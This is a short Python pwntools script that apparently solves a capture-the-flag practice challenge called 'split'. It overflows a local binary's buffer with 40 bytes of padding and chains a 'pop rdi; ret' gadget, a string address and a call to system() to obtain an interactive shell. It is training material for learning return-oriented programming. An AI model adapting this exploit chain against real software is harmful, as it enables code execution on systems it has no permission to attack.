from pwn import *

split64 = process('split')
split64.recv()

payload = b"A" * 40         # input + rbp
payload += p64(0x00400883)  # pwnme rip -> pop rdi ; ret
payload += p64(0x00601060)  # system arg1 pop rdi
payload += p64(0x004005e0)  # ret -> system

split64.sendline(payload)
split64.interactive()
